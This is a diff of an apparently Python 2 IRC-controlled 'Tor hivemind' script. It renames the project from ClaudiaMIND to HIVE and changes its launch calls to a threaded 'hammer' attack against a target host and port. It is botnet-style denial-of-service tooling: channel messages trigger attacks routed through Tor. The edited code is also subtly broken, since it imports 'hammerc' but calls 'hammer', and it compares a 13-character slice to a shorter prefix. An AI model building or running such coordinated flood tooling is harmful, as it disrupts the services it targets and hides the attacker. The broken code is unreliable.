@@ -3,7 +3,7 @@
 from urllib2 import urlopen
 import platform
 import re
-import claudiashammer
+import hammerc
 import argparse
 import getpass
 import socks
@@ -32,15 +32,15 @@ Windows = isWindows()
 class hammer(threading.Thread):
 	def run(self):
 		if (tor == True) and (torattack == True):
-			claudiashammer.main(target, int(threads), int(port), False)
+			hammer.main(target, int(threads), int(port), False)
 		elif (tor == True) and (torattack == False):
 			fail("Unlucky, you will attack using Tor. (the entire script runs within Tor and I'm lazy to add this feature which is totally useless)")
 			time.sleep(1)
-			claudiashammer.main(target, int(threads), int(port), False)
+			hammer.main(target, int(threads), int(port), False)
 		elif (tor == False) and (torattack == True):
-			claudiashammer.main(target, int(threads), int(port), True)
+			hammer.main(target, int(threads), int(port), True)
 		elif (tor == False) and (torattack == False):
-			claudiashammer.main(target, int(threads), int(port), False)
+			hammer.main(target, int(threads), int(port), False)
 
 
 # Notes
@@ -82,13 +82,13 @@ else:
 		UNDERLINE = '\033[4m'
 
 art = """
-  ____ _                 _ _       __  __ ___ _   _ ____  
- / ___| | __ _ _   _  __| (_) __ _|  \/  |_ _| \ | |  _ \ 
-| |   | |/ _` | | | |/ _` | |/ _` | |\/| || ||  \| | | | |
-| |___| | (_| | |_| | (_| | | (_| | |  | || || |\  | |_| |
- \____|_|\__,_|\__,_|\__,_|_|\__,_|_|  |_|___|_| \_|____/ 
-                                                          
-                                  1337 Tor hivemind                       
+ _   _ _____     _______ 
+| | | |_ _\ \   / / ____|
+| |_| || | \ \ / /|  _|  
+|  _  || |  \ V / | |___ 
+|_| |_|___|  \_/  |_____|
+
+              1337 Tor hivemind                       
 """
 
 def okblue(msg):
@@ -176,7 +176,7 @@ if args.version:
 
 def stop(out):
 	get_previous()
-	claudiashammer.stop_now = True
+	hammer.stop_now = True
 	if out == 1:
 		message("Stopping the attack")
 	target = None
@@ -187,7 +187,7 @@ okblue(art)
 time.sleep(1)
 
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
-okblue("v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND")
+okblue("v" + version + " see: https://github.com/ClaudiaDAnon/HIVE")
 
 if Windows:
 	socksport = args.port if args.port else raw_input(lang["socksport"] + " (" + lang["defscport"] + str(9150) + "): ");
@@ -357,10 +357,10 @@ while 1:
 	
 	#check for commands only authorized people can give
 
-	if (destination == channel) or (sentmessage[:13] == "claudiamind :"):
+	if (destination == channel) or (sentmessage[:13] == "hive :"):
 
-		if sentmessage[:13] == "claudiamind :":
-			sentmessage = sentmessage.replace("claudiamind :", "")
+		if sentmessage[:13] == "hive :":
+			sentmessage = sentmessage.replace("hive :", "")
 
 		if nickname in sentmessage:
 			print bcolors.OKGREEN + "<" + senderuser + "> " + sentmessage + bcolors.ENDC 
